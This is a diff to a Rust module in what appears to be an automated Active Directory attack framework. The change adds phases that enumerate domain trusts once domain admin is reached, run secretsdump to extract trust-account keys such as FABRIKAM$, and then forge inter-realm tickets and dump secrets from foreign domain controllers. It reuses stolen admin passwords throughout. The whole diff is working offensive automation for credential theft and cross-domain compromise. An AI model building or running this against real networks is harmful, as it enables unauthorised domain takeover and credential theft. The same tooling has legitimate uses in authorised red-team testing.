@@ -1,11 +1,13 @@
-//! auto_trust_follow -- cross-domain attacks when trust keys are discovered.
+//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
 //!
-//! When a trust account hash (e.g. `ESSOS$`) is found via secretsdump and the
-//! account name ends with `$`, this automation dispatches:
-//!   1. Inter-realm TGT creation (create_inter_realm_ticket)
-//!   2. Secretsdump against the foreign domain DC
+//! Three-phase automation:
 //!
-//! This mirrors the Python `_auto_dispatch_trust_key_extraction_threaded()`.
+//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
+//!    to discover trust relationships via LDAP.
+//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
+//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
+//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
+//!    ticket creation and secretsdump against the foreign DC.
 
 use std::sync::Arc;
 use std::time::Duration;
@@ -32,6 +34,160 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             break;
         }
 
+        // --- Phase 1: Auto-enumerate trusts when DA is achieved ---
+        {
+            let state = dispatcher.state.read().await;
+            if state.has_domain_admin {
+                // Dispatch trust enumeration for each known DC (once per domain)
+                let enum_work: Vec<(String, String, String)> = state
+                    .domain_controllers
+                    .iter()
+                    .filter(|(domain, _)| {
+                        let key = format!("trust_enum:{}", domain.to_lowercase());
+                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
+                    })
+                    .map(|(domain, dc_ip)| {
+                        let key = format!("trust_enum:{}", domain.to_lowercase());
+                        (key, domain.clone(), dc_ip.clone())
+                    })
+                    .collect();
+                drop(state);
+
+                for (key, domain, dc_ip) in enum_work {
+                    // Find a credential for this domain
+                    let cred = {
+                        let s = dispatcher.state.read().await;
+                        s.credentials
+                            .iter()
+                            .find(|c| {
+                                !c.password.is_empty()
+                                    && (c.domain.to_lowercase() == domain.to_lowercase()
+                                        || domain
+                                            .to_lowercase()
+                                            .ends_with(&format!(".{}", c.domain.to_lowercase())))
+                            })
+                            .cloned()
+                    };
+
+                    if let Some(cred) = cred {
+                        let payload = json!({
+                            "techniques": ["enumerate_domain_trusts"],
+                            "target_ip": dc_ip,
+                            "domain": domain,
+                            "credential": {
+                                "username": cred.username,
+                                "password": cred.password,
+                                "domain": cred.domain,
+                            },
+                        });
+
+                        match dispatcher
+                            .throttled_submit("recon", "recon", payload, 3)
+                            .await
+                        {
+                            Ok(Some(task_id)) => {
+                                info!(
+                                    task_id = %task_id,
+                                    domain = %domain,
+                                    "Trust enumeration dispatched"
+                                );
+                                dispatcher
+                                    .state
+                                    .write()
+                                    .await
+                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                                let _ = dispatcher
+                                    .state
+                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                                    .await;
+                            }
+                            Ok(None) => {}
+                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
+                        }
+                    }
+                }
+            }
+        }
+
+        // --- Phase 2: Extract trust keys for known cross-forest trusts ---
+        {
+            let state = dispatcher.state.read().await;
+            if state.has_domain_admin && !state.trusted_domains.is_empty() {
+                let extract_work: Vec<(String, String, String, String)> = state
+                    .trusted_domains
+                    .values()
+                    .filter(|trust| trust.is_cross_forest())
+                    .filter_map(|trust| {
+                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
+                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
+                            return None;
+                        }
+                        // Find a DC in the source domain (our domain, not the trust target)
+                        // The trust domain is the foreign one; we need to secretsdump our DC
+                        let source_domain = state.domains.first()?;
+                        let dc_ip = state
+                            .domain_controllers
+                            .get(&source_domain.to_lowercase())
+                            .cloned()?;
+                        Some((key, trust.flat_name.clone(), trust.domain.clone(), dc_ip))
+                    })
+                    .collect();
+                let admin_cred = state
+                    .credentials
+                    .iter()
+                    .find(|c| c.is_admin && !c.password.is_empty())
+                    .cloned();
+                drop(state);
+
+                if let Some(cred) = admin_cred {
+                    for (key, flat_name, trust_domain, dc_ip) in extract_work {
+                        // secretsdump -just-dc-user FABRIKAM$ to get trust key
+                        let trust_account = format!("{}$", flat_name.to_uppercase());
+                        let payload = json!({
+                            "technique": "secretsdump",
+                            "target_ip": dc_ip,
+                            "domain": cred.domain,
+                            "just_dc_user": trust_account,
+                            "credential": {
+                                "username": cred.username,
+                                "password": cred.password,
+                                "domain": cred.domain,
+                            },
+                            "reason": format!("extract trust key for {}", trust_domain),
+                        });
+
+                        match dispatcher
+                            .throttled_submit("credential_access", "credential_access", payload, 2)
+                            .await
+                        {
+                            Ok(Some(task_id)) => {
+                                info!(
+                                    task_id = %task_id,
+                                    trust_account = %trust_account,
+                                    trust_domain = %trust_domain,
+                                    "Trust key extraction dispatched"
+                                );
+                                dispatcher
+                                    .state
+                                    .write()
+                                    .await
+                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                                let _ = dispatcher
+                                    .state
+                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                                    .await;
+                            }
+                            Ok(None) => {}
+                            Err(e) => {
+                                warn!(err = %e, "Failed to dispatch trust key extraction")
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // --- Phase 3: Follow trust keys (inter-realm ticket + foreign secretsdump) ---
         let work: Vec<TrustFollowWork> = {
             let state = dispatcher.state.read().await;
 
@@ -44,7 +200,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 .hashes
                 .iter()
                 .filter_map(|hash| {
-                    // Trust accounts end with $ (e.g. ESSOS$, CHILD$)
+                    // Trust accounts end with $ (e.g. FABRIKAM$, CHILD$)
                     if !hash.username.ends_with('$') {
                         return None;
                     }
